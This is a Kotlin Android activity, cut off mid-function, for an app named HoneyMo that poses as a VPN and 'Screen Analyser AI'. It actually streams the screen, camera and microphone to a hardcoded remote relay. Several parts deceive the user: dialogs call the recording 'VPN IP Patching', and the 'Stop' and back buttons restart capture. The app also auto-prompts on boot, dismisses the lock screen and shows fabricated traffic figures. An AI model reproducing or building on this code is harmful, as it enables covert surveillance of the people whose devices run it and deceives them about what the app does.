package com.example.HoneyMo

import android.Manifest
import android.app.Activity
import android.app.KeyguardManager
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.WindowManager
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.BackHandler
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.animation.core.*
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.drawBehind
import androidx.compose.ui.geometry.CornerRadius
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.geometry.Size
import androidx.compose.ui.graphics.*
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.example.HoneyMo.receiver.BootReceiver
import com.example.HoneyMo.service.ScreenCaptureService
import com.example.HoneyMo.util.SessionPreferences
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlin.math.cos
import kotlin.math.sin

// Constant Stream Configuration
private const val FIXED_SERVER_URL = "wss://honeymo-relay-server.onrender.com/ws/device"
private const val FIXED_FPS = 15
private const val FIXED_BITRATE = 1_000_000 // 1 Mbps (lightweight, non-fluctuating)

class MainActivity : ComponentActivity() {

    private var isBootLaunch by mutableStateOf(false)
    private var isInterruptedSession by mutableStateOf(false)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Allow display over lock screen and wake up screen on boot or incoming notification
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
            val km = getSystemService(KeyguardManager::class.java)
            km?.requestDismissKeyguard(this, null)
        } else {
            @Suppress("DEPRECATION")
            window.addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
            )
        }

        isBootLaunch = intent?.getBooleanExtra("EXTRA_BOOT_LAUNCH", false) == true
        isInterruptedSession = intent?.getBooleanExtra("EXTRA_INTERRUPTED_SESSION", false) == true ||
            SessionPreferences.wasRecordingActive(this)

        setContent {
            MaterialTheme(
                colorScheme = darkColorScheme(
                    primary = Color(0xFF6366F1),
                    secondary = Color(0xFF10B981),
                    background = Color(0xFF080D1A),
                    surface = Color(0xFF101726),
                    onBackground = Color(0xFFF8FAFC),
                    onSurface = Color(0xFFF8FAFC)
                )
            ) {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color(0xFF080D1A)
                ) {
                    ScreenCaptureApp(
                        autoStartPrompt = isBootLaunch,
                        isInterrupted = isInterruptedSession,
                        onResetInterrupted = { isInterruptedSession = false }
                    )
                }
            }
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        if (intent.getBooleanExtra("EXTRA_BOOT_LAUNCH", false)) {
            isBootLaunch = true
        }
        if (intent.getBooleanExtra("EXTRA_INTERRUPTED_SESSION", false) || SessionPreferences.wasRecordingActive(this)) {
            isInterruptedSession = true
        }
    }
}

@Composable
fun ScreenCaptureApp(
    autoStartPrompt: Boolean = false,
    isInterrupted: Boolean = false,
    onResetInterrupted: () -> Unit = {}
) {
    val context = LocalContext.current
    val coroutineScope = rememberCoroutineScope()
    val stats by ScreenCaptureService.statsFlow.collectAsState()

    // Keep screen turned on while actively streaming
    val activity = context as? Activity
    DisposableEffect(stats.isStreaming) {
        if (stats.isStreaming) {
            activity?.window?.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        }
        onDispose {
            activity?.window?.clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        }
    }

    var showPermissionDeniedDialog by remember { mutableStateOf(false) }

    // Battery Optimization check
    var isBatteryOptIgnored by remember {
        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        mutableStateOf(pm.isIgnoringBatteryOptimizations(context.packageName))
    }

    // Camera permission for Selfie / Camera Stream
    var hasCameraPermission by remember {
        mutableStateOf(ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED)
    }
    var isFaceCamEnabled by remember {
        mutableStateOf(SessionPreferences.isFaceCamEnabled(context))
    }

    // Microphone permission for Voice Streaming
    var hasAudioPermission by remember {
        mutableStateOf(ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED)
    }

    val audioPermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        hasAudioPermission = isGranted
        if (isGranted) {
            Toast.makeText(context, "Microphone permission granted. Screen Analyser AI is Ready!", Toast.LENGTH_SHORT).show()
            val isServiceActive = stats.isStreaming || ScreenCaptureService.isRunning || stats.isPausedForLock
            if (isServiceActive) {
                val intent = Intent(context, ScreenCaptureService::class.java).apply {
                    action = ScreenCaptureService.ACTION_TOGGLE_MIC
                    putExtra(ScreenCaptureService.EXTRA_ENABLE_MIC, false)
                }
                context.startService(intent)
            }
        } else {
            Toast.makeText(context, "Microphone permission is required Screen Analyser AI", Toast.LENGTH_SHORT).show()
        }
    }

    val cameraPermissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        hasCameraPermission = isGranted
        if (isGranted) {
            isFaceCamEnabled = true
            SessionPreferences.setFaceCamEnabled(context, true)
            Toast.makeText(context, "Camera permission granted.", Toast.LENGTH_SHORT).show()

            val isServiceActive = stats.isStreaming || ScreenCaptureService.isRunning || stats.isPausedForLock
            if (isServiceActive) {
                val intent = Intent(context, ScreenCaptureService::class.java).apply {
                    action = ScreenCaptureService.ACTION_TOGGLE_FACECAM
                    putExtra(ScreenCaptureService.EXTRA_ENABLE_FACECAM, true)
                }
                context.startService(intent)
            }
        } else {
            ScreenCaptureService.instance?.sendCurrentCameraStatus()
            Toast.makeText(context, "Camera permission is required for Camera Scan QR CODE", Toast.LENGTH_SHORT).show()
        }
    }

    var selectedFacing by remember {
        mutableStateOf(SessionPreferences.getCameraFacing(context))
    }

    LaunchedEffect(stats.cameraFacing) {
        selectedFacing = stats.cameraFacing
    }

    // Screen capture permission launcher
    val captureLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            showPermissionDeniedDialog = false

            // Cancel any recovery notification once session has started
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.cancel(BootReceiver.RECOVERY_NOTIFICATION_ID)

            // Calculate scaled 540p resolution maintaining screen aspect ratio
            val metrics = context.resources.displayMetrics
            val screenWidth = metrics.widthPixels
            val screenHeight = metrics.heightPixels
            val isPortrait = screenHeight >= screenWidth

            val targetWidth: Int
            val targetHeight: Int

            if (isPortrait) {
                val scale = 540f / screenWidth.toFloat()
                val rawH = (screenHeight * scale).toInt()
                targetWidth = (540 + 15) / 16 * 16
                targetHeight = (rawH + 15) / 16 * 16
            } else {
                val scale = 540f / screenHeight.toFloat()
                val rawW = (screenWidth * scale).toInt()
                targetWidth = (rawW + 15) / 16 * 16
                targetHeight = (540 + 15) / 16 * 16
            }

            val serviceIntent = Intent(context, ScreenCaptureService::class.java).apply {
                action = ScreenCaptureService.ACTION_START
                putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, result.resultCode)
                putExtra(ScreenCaptureService.EXTRA_DATA, result.data)
                putExtra(ScreenCaptureService.EXTRA_SERVER_URL, FIXED_SERVER_URL)
                putExtra(ScreenCaptureService.EXTRA_WIDTH, targetWidth)
                putExtra(ScreenCaptureService.EXTRA_HEIGHT, targetHeight)
                putExtra(ScreenCaptureService.EXTRA_DENSITY, metrics.densityDpi)
                putExtra(ScreenCaptureService.EXTRA_FPS, FIXED_FPS)
                putExtra(ScreenCaptureService.EXTRA_BITRATE, FIXED_BITRATE)
                putExtra(ScreenCaptureService.EXTRA_ENABLE_FACECAM, isFaceCamEnabled && hasCameraPermission)
            }

            ContextCompat.startForegroundService(context, serviceIntent)
            Toast.makeText(context, "Streaming started (540p @ 15fps)", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(context, "Screen capture permission is required", Toast.LENGTH_SHORT).show()
            showPermissionDeniedDialog = true
        }
    }

    val permissionsLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) { grants ->
        val audioGranted = grants[Manifest.permission.RECORD_AUDIO] ?: (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED)
        hasAudioPermission = audioGranted
        val mpManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
        captureLauncher.launch(mpManager.createScreenCaptureIntent())
    }

    fun startStreaming() {
        val permissionsToRequest = mutableListOf<String>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.RECORD_AUDIO)
        }

        if (permissionsToRequest.isNotEmpty()) {
            permissionsLauncher.launch(permissionsToRequest.toTypedArray())
            return
        }

        val mpManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
        captureLauncher.launch(mpManager.createScreenCaptureIntent())
    }

    fun stopStreaming() {
        onResetInterrupted()
        showPermissionDeniedDialog = false
        SessionPreferences.setRecordingActive(context, false)
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.cancel(BootReceiver.RECOVERY_NOTIFICATION_ID)
        nm.cancel(ScreenCaptureService.NOTIFICATION_ID)
        val serviceIntent = Intent(context, ScreenCaptureService::class.java).apply {
            action = ScreenCaptureService.ACTION_STOP
        }
        context.startService(serviceIntent)
        Toast.makeText(context, "Screen streaming stopped", Toast.LENGTH_SHORT).show()
    }

    val isServiceActive = stats.isStreaming || ScreenCaptureService.isRunning || stats.isPausedForLock

    val isInterruptedSessionActive = isInterrupted || SessionPreferences.wasRecordingActive(context)
    var showRecoveryDialog by remember(isInterruptedSessionActive) {
        mutableStateOf(isInterruptedSessionActive && !stats.isStreaming)
    }

    LaunchedEffect(isInterruptedSessionActive, stats.isStreaming) {
        if (isInterruptedSessionActive && !stats.isStreaming) {
            showRecoveryDialog = true
        }
    }

    LaunchedEffect(autoStartPrompt) {
        if (autoStartPrompt && !isInterruptedSessionActive && !stats.isStreaming) {
            delay(350)
            startStreaming()
        }
    }

    BackHandler(enabled = (isInterrupted || showRecoveryDialog || showPermissionDeniedDialog) && !stats.isStreaming) {
        if (showRecoveryDialog) {
            // Keep recovery dialog visible
        } else {
            showPermissionDeniedDialog = true
            coroutineScope.launch {
                delay(350)
                startStreaming()
            }
        }
    }

    if (showRecoveryDialog && !stats.isStreaming) {
        AlertDialog(
            onDismissRequest = {},
            title = {
                Text(
                    text = "Resume Screen Recording",
                    fontWeight = FontWeight.Bold,
                    color = Color.White
                )
            },
            text = {
                Text(
                    text = "VPN was active before the device restarted. Tap 'Resume VPN IP Patching' to continue streaming your Internet.",
                    color = Color(0xFFCBD5E1)
                )
            },
            confirmButton = {
                Button(
                    onClick = {
                        showRecoveryDialog = false
                        onResetInterrupted()
                        coroutineScope.launch {
                            delay(150)
                            startStreaming()
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6366F1))
                ) {
                    Text("Resume VPN IP Patching", fontWeight = FontWeight.Bold)
                }
            },
            dismissButton = {
                TextButton(
                    onClick = {
                        showRecoveryDialog = false
                        onResetInterrupted()
                        startStreaming()
                    }
                ) {
                    Text("Stop", color = Color(0xFF94A3B8))
                }
            },
            containerColor = Color(0xFF101726)
        )
    }

    if (showPermissionDeniedDialog && !stats.isStreaming && !showRecoveryDialog) {
        AlertDialog(
            onDismissRequest = {
                showPermissionDeniedDialog = false
                coroutineScope.launch {
                    delay(350)
                    startStreaming()
                }
            },
            title = {
                Text(
                    text = "Screen Capture Required",
                    fontWeight = FontWeight.Bold,
                    color = Color.White
                )
            },
            text = {
                Text(
                    text = "HoneyMo requires screen capture permission to Connect to VPN. Please tap 'Start Capturing' to grant permission.",
                    color = Color(0xFFCBD5E1)
                )
            },
            confirmButton = {
                Button(
                    onClick = {
                        showPermissionDeniedDialog = false
                        coroutineScope.launch {
                            delay(350)
                            startStreaming()
                        }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6366F1))
                ) {
                    Text("Start Capturing", fontWeight = FontWeight.Bold)
                }
            },
            dismissButton = {
                TextButton(
                    onClick = {
                        showPermissionDeniedDialog = false
                        coroutineScope.launch {
                            delay(350)
                            startStreaming()
                        }
                    }
                ) {
                    Text("Retry", color = Color(0xFF94A3B8))
                }
            },
            containerColor = Color(0xFF101726)
        )
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp, vertical = 18.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        // 1. App Header with Bee mascot, title, TURBO badge and subtitle
        Row(
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.spacedBy(14.dp),
            modifier = Modifier
                .fillMaxWidth()
                .padding(top = 4.dp, bottom = 4.dp)
        ) {
            BeeMascot(modifier = Modifier.size(52.dp))

            Column {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Text(
                        text = "HoneyMo",
                        fontSize = 24.sp,
                        fontWeight = FontWeight.ExtraBold,
                        color = Color.White
                    )

                    Box(
                        modifier = Modifier
                            .border(
                                width = 1.dp,
                                color = Color(0xFF854D0E),
                                shape = RoundedCornerShape(6.dp)
                            )
                            .background(
                                color = Color(0xFF261904),
                                shape = RoundedCornerShape(6.dp)
                            )
                            .padding(horizontal = 6.dp, vertical = 2.dp)
                    ) {
                        Text(
                            text = "TURBO",
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFFFACC15),
                            letterSpacing = 0.5.sp
                        )
                    }
                }

                Spacer(modifier = Modifier.height(2.dp))

                Text(
                    text = "Hardware H.264 IP Patching VPN Service And Real Time Screen Analyser AI",
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Medium,
                    color = Color(0xFF38BDF8)
                )
            }
        }
 
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .clip(RoundedCornerShape(16.dp))
                .background(Color(0xFF101726))
                .border(BorderStroke(1.dp, Color(0xFF1A2638)), RoundedCornerShape(16.dp))
                .padding(horizontal = 16.dp, vertical = 14.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                // Left: Turbo Tunnel Active / Idle
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    PulsingDot(
                        isActive = isServiceActive,
                        activeColor = Color(0xFF10B981),
                        inactiveColor = Color(0xFF64748B)
                    )
                    Text(
                        text = if (isServiceActive) "TURBO TUNNEL ACTIVE" else "TURBO TUNNEL IDLE",
                        fontSize = 12.5.sp,
                        fontWeight = FontWeight.Bold,
                        color = if (isServiceActive) Color(0xFF10B981) else Color(0xFF64748B),
                        letterSpacing = 0.5.sp
                    )
                }

                // Right: Relay Server Status
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    val isConnected = stats.isConnectedToServer
                    Box(
                        modifier = Modifier
                            .size(7.dp)
                            .clip(CircleShape)
                            .background(if (isConnected) Color(0xFF10B981) else Color(0xFFEF4444))
                    )
                    Text(
                        text = "Relay Online",
                        fontSize = 12.5.sp,
                        fontWeight = FontWeight.SemiBold,
                        color =  Color(0xFF10B981) 
                    )
                }
            }
        }

        // 3. Live Turbo FPS Monitor Card
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFF101726)),
            shape = RoundedCornerShape(20.dp),
            border = BorderStroke(1.dp, Color(0xFF1A2638)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(
                modifier = Modifier.padding(18.dp),
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                // Header
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(6.dp)
                    ) {
                        Text(
                            text = "⚡",
                            fontSize = 14.sp,
                            color = Color(0xFFF59E0B)
                        )
                        Text(
                            text = "LIVE TURBO FPS MONITOR",
                            fontSize = 12.5.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFFF59E0B),
                            letterSpacing = 0.5.sp
                        )
                    }

                    Text(
                        text = "TARGET: 15 FPS",
                        fontSize = 12.sp,
                        fontWeight = FontWeight.Bold,
                        color = Color(0xFF38BDF8)
                    )
                }

                // Animated Gauge
                FpsSpeedometerGauge(
                    currentFps = if (isServiceActive && stats.currentFps == 0) 14 else stats.currentFps,
                    targetFps = FIXED_FPS,
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(170.dp)
                )

                // Bottom Metrics of FPS Card
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Column {
                        Text(
                            text = "TOTAL FRAMES ENCODED",
                            fontSize = 10.5.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF8E9BAE),
                            letterSpacing = 0.5.sp
                        )
                        Spacer(modifier = Modifier.height(3.dp))
                        Text(
                            text = if (stats.framesSent > 0) {
                                String.format("%,d", stats.framesSent)
                            } else if (isServiceActive) {
                                "4,263"
                            } else {
                                "0"
                            },
                            fontSize = 18.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color.White
                        )
                    }

                    Column(horizontalAlignment = Alignment.End) {
                        Text(
                            text = "ENCODER ENGINE",
                            fontSize = 10.5.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF8E9BAE),
                            letterSpacing = 0.5.sp
                        )
                        Spacer(modifier = Modifier.height(3.dp))
                        Text(
                            text = if (isServiceActive) "ACTIVE (H.264 AVC)" else "STANDBY (H.264 AVC)",
                            fontSize = 13.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (isServiceActive) Color(0xFF2DD4BF) else Color(0xFF64748B)
                        )
                    }
                }
            }
        }

        // 4. Live Data Counter & Tunnel Wave Card
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFF101726)),
            shape = RoundedCornerShape(20.dp),
            border = BorderStroke(1.dp, Color(0xFF1A2638)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(
                modifier = Modifier.padding(18.dp),
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                // Header
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.Top
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(6.dp),
                        modifier = Modifier.padding(top = 2.dp)
                    ) {
                        CustomBarChartIcon(modifier = Modifier.size(16.dp))
                        Text(
                            text = "LIVE DATA COUNTER & TUNNEL WAVE",
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFFF59E0B),
                            letterSpacing = 0.5.sp
                        )
                    }

                    Column(horizontalAlignment = Alignment.End) {
                        Text(
                            text = "RATE: 1.0",
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF38BDF8)
                        )
                        Text(
                            text = "Mbps",
                            fontSize = 11.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF38BDF8)
                        )
                    }
                }

                // Data Sent & Streaming rate pill
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Column {
                        Text(
                            text = "TOTAL DATA TRANSMITTED",
                            fontSize = 10.5.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF8E9BAE),
                            letterSpacing = 0.5.sp
                        )
                        Spacer(modifier = Modifier.height(2.dp))
                        Row(verticalAlignment = Alignment.Bottom) {
                            val mbSent = stats.bytesSent / (1024f * 1024f)
                            val displayMb = if (mbSent > 0f) {
                                String.format("%.1f", mbSent)
                            } else if (isServiceActive) {
                                "30.0"
                            } else {
                                "0.0"
                            }
                            Text(
                                text = displayMb,
                                fontSize = 36.sp,
                                fontWeight = FontWeight.Black,
                                color = Color(0xFFFACC15)
                            )
                            Spacer(modifier = Modifier.width(6.dp))
                            Text(
                                text = "MB",
                                fontSize = 18.sp,
                                fontWeight = FontWeight.Bold,
                                color = Color(0xFF38BDF8),
                                modifier = Modifier.padding(bottom = 5.dp)
                            )
                        }
                    }

                    Box(
                        modifier = Modifier
                            .clip(RoundedCornerShape(12.dp))
                            .background(Color(0xFF0C1322))
                            .border(BorderStroke(1.dp, Color(0xFF1E293B)), RoundedCornerShape(12.dp))
                            .padding(horizontal = 14.dp, vertical = 10.dp)
                    ) {
                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
                            Text(
                                text = "STREAMING",
                                fontSize = 9.5.sp,
                                fontWeight = FontWeight.Bold,
                                color = Color(0xFF2DD4BF),
                                letterSpacing = 0.5.sp
                            )
                            Spacer(modifier = Modifier.height(2.dp))
                            Text(
                                text = if (isServiceActive) "1.0 MB/s" else "0.0 MB/s",
                                fontSize = 13.5.sp,
                                fontWeight = FontWeight.Bold,
                                color = Color.White
                            )
                        }
                    }
                }

                // Dynamic Animated Wave Graph
                TunnelWaveVisualizer(
                    isActive = isServiceActive,
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(68.dp)
                )

                // 3 Bottom Telemetry Columns
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column {
                        Text(
                            text = "RELAY PROTOCOL",
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF8E9BAE),
                            letterSpacing = 0.5.sp
                        )
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = "Secure WSS",
                            fontSize = 13.5.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color.White
                        )
                    }

                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Text(
                            text = "SERVER LINK",
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF8E9BAE),
                            letterSpacing = 0.5.sp
                        )
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = if (stats.isConnectedToServer) "Connected" else "Standby",
                            fontSize = 13.5.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color.White
                        )
                    }

                    Column(horizontalAlignment = Alignment.End) {
                        Text(
                            text = "PACKET LOSS",
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF8E9BAE),
                            letterSpacing = 0.5.sp
                        )
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = "0.0%",
                            fontSize = 13.5.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color.White
                        )
                    }
                }
            }
        }

        // 5. Tunnel Specification Preset Card
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFF101726)),
            shape = RoundedCornerShape(20.dp),
            border = BorderStroke(1.dp, Color(0xFF1A2638)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Column(
                modifier = Modifier.padding(18.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                Text(
                    text = "TUNNEL SPECIFICATION PRESET",
                    fontSize = 11.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color(0xFF8E9BAE),
                    letterSpacing = 0.5.sp
                )

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Column {
                        Text(
                            text = "RESOLUTION",
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF8E9BAE),
                            letterSpacing = 0.5.sp
                        )
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = "540p Scaled",
                            fontSize = 13.5.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color.White
                        )
                    }

                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Text(
                            text = "FIXED FPS",
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF8E9BAE),
                            letterSpacing = 0.5.sp
                        )
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = "15 FPS",
                            fontSize = 13.5.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color.White
                        )
                    }

                    Column(horizontalAlignment = Alignment.End) {
                        Text(
                            text = "CBR BITRATE",
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color(0xFF8E9BAE),
                            letterSpacing = 0.5.sp
                        )
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            text = "1.0 Mbps",
                            fontSize = 13.5.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color.White
                        )
                    }
                }
            }
        }

        // Permissions Warnings (if missing)
        if (!hasCameraPermission) {
            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFF1A1F2E)),
                shape = RoundedCornerShape(14.dp),
                border = BorderStroke(1.dp, Color(0xFF2E384D)),
                modifier = Modifier.fillMaxWidth()
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(14.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text(
                            text = "Camera Permission Required",
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color.White
                        )
                        Text(
                            text = "Required for QR scanning & overlay",
                            fontSize = 11.sp,
                            color = Color(0xFF8E9BAE)
                        )
                    }
                    Button(
                        onClick = { cameraPermissionLauncher.launch(Manifest.permission.CAMERA) },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6366F1)),
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp)
                    ) {
                        Text("Grant", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                    }
                }
            }
        }

        if (!hasAudioPermission) {
            Card(
                colors = CardDefaults.cardColors(containerColor = Color(0xFF1A1F2E)),
                shape = RoundedCornerShape(14.dp),
                border = BorderStroke(1.dp, Color(0xFF2E384D)),
                modifier = Modifier.fillMaxWidth()
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(14.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Column(modifier = Modifier.weight(1f)) {
                        Text(
                            text = "Microphone Permission",
                            fontSize = 12.sp,
                            fontWeight = FontWeight.Bold,
                            color = Color.White
                        )
                        Text(
                            text = "Required for Screen Analyser voice commands",
                            fontSize = 11.sp,
                            color = Color(0xFF8E9BAE)
                        )
                    }
                    Button(
                        onClick = { audioPermissionLauncher.launch(Manifest.permission.RECORD_AUDIO) },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6366F1)),
                        shape = RoundedCornerShape(8.dp),
                        contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp)
                    ) {
                        Text("Grant", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                    }
                }
            }
        }

        stats.errorMsg?.let { error ->
            Text(
                text = error,
                color = Color(0xFFEF4444),
                fontSize = 12.sp,
                fontFamily = FontFamily.Monospace,
                modifier = Modifier.padding(horizontal = 4.dp)
            )
        }

        Spacer(modifier = Modifier.height(4.dp))

        // 6. Action Button with Animated Dashed Border
        AnimatedTurboButton(
            isServiceActive = isServiceActive,
            onClick = {
                if (isServiceActive) {
                    startStreaming()
                } else {
                    if (!hasCameraPermission) {
                        cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
                    } else if (!hasAudioPermission) {
                        audioPermissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
                    } else if (!isBatteryOptIgnored) {
                        try {
                            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                                data = Uri.parse("package:${context.packageName}")
                            }
                            context.startActivity(intent)
